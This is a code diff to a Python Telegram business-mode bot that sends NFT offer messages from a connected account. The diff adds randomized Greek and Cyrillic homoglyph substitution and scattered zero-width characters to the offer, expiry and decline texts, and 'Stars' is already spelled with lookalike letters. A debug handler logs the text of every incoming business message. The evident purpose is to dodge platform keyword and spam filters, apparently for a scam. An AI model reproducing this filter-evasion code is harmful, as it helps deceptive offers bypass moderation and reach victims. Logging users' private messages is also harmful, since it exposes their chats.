@@ -89,14 +89,18 @@ def mask_stars(currency: str) -> str:
         return "Ѕtаrѕ"
     return currency.capitalize()
 
-CYR_TO_LAT = {
-    "а": "a", "е": "e", "о": "o", "р": "p", "с": "c", "х": "x", "у": "y",
-    "А": "A", "Е": "E", "О": "O", "Р": "P", "С": "C", "Х": "X", "У": "Y",
-    "і": "i", "І": "I",
-}
+LOOKALIKE_SETS = [
+    {"а": "α", "е": "ε", "о": "ο", "р": "ρ", "с": "с", "х": "х", "у": "υ", "к": "κ", "м": "м", "т": "τ", "А": "Α", "Е": "Ε", "О": "Ο", "Р": "Ρ", "С": "Ϲ", "Т": "Τ", "У": "Υ", "К": "Κ", "М": "Μ"},
+    {"а": "а", "е": "е", "о": "о", "р": "р", "с": "с", "х": "х", "у": "у", "к": "к", "м": "м", "т": "т", "А": "А", "Е": "Е", "О": "О", "Р": "Р", "С": "С", "Т": "Т", "У": "У", "К": "К", "М": "М"},
+    {"а": "a", "е": "e", "о": "o", "р": "p", "с": "c", "х": "x", "у": "y", "к": "k", "м": "m", "т": "t", "А": "A", "Е": "E", "О": "O", "Р": "P", "С": "C", "Т": "T", "У": "Y", "К": "K", "М": "M"},
+    {"а": "α", "е": "ε", "о": "ο", "р": "ρ", "с": "ϲ", "х": "χ", "у": "υ", "к": "κ", "м": "μ", "т": "τ", "А": "Α", "Е": "Ε", "О": "Ο", "Р": "Ρ", "С": "Ϲ", "Т": "Τ", "У": "Υ", "К": "Κ", "М": "Μ"},
+    {"а": "а", "е": "е", "о": "ο", "р": "ρ", "с": "с", "х": "х", "у": "υ", "к": "κ", "м": "м", "т": "τ", "А": "А", "Е": "Е", "О": "Ο", "Р": "Ρ", "С": "С", "Т": "Τ", "У": "Υ", "К": "Κ", "М": "М"},
+]
 
-def smart_randomize(text: str) -> str:
-    probability = random.uniform(0.25, 0.55)
+INVISIBLE = ["\u200b", "\u200c", "\u200d", "\u2060", "\ufeff"]
+
+def multi_script_randomize(text: str) -> str:
+    char_map = random.choice(LOOKALIKE_SETS)
     result = []
     i = 0
     n = len(text)
@@ -129,10 +133,10 @@ def smart_randomize(text: str) -> str:
                 continue
 
         char = text[i]
-        if char in CYR_TO_LAT and random.random() < probability:
-            result.append(CYR_TO_LAT[char])
-        else:
-            result.append(char)
+        replaced = char_map.get(char, char)
+        result.append(replaced)
+        if random.random() < 0.15 and char not in "<>":
+            result.append(random.choice(INVISIBLE))
         i += 1
     return "".join(result)
 
@@ -300,9 +304,9 @@ async def cmd_rep_business(message: types.Message):
         nft_link="@@NFT@@",
     )
 
-    offer_text_rand = smart_randomize(offer_text_raw) if lang in ("ru", "ua") else offer_text_raw
+    offer_text_rand = multi_script_randomize(offer_text_raw)
     nft_name_rand = nft_full_name
-    expires_text = smart_randomize(t['offer_expires']) if lang in ("ru", "ua") else t['offer_expires']
+    expires_text = multi_script_randomize(t['offer_expires'])
 
     nft_link = f'<a href="{nft_url}">{nft_name_rand}</a>'
 
@@ -412,7 +416,7 @@ async def process_decline(callback: CallbackQuery):
     lang = offer["lang"]
     t = TEXTS[lang]
 
-    declined_rand = smart_randomize(t['declined']) if lang in ("ru", "ua") else t['declined']
+    declined_rand = multi_script_randomize(t['declined'])
     text = f"{cross_emoji()} {declined_rand}"
 
     try:
@@ -422,3 +426,24 @@ async def process_decline(callback: CallbackQuery):
             business_connection_id=callback.message.business_connection_id,
             text=text,
             link_preview_options=LinkPreviewOptions(is_disabled=True),
+            parse_mode="HTML"
+        )
+    except Exception as e:
+        print(f"[EDIT ERROR] {e}")
+
+    await callback.answer()
+
+@dp.callback_query(F.data.startswith("confirm_"))
+async def process_confirm(callback: CallbackQuery):
+    await callback.answer()
+
+@dp.business_message()
+async def debug_business(message: types.Message):
+    print(f"[BUSINESS DEBUG] {message.text!r} | conn_id={message.business_connection_id}")
+
+async def main():
+    print("Бот запущен (Business Mode)...")
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
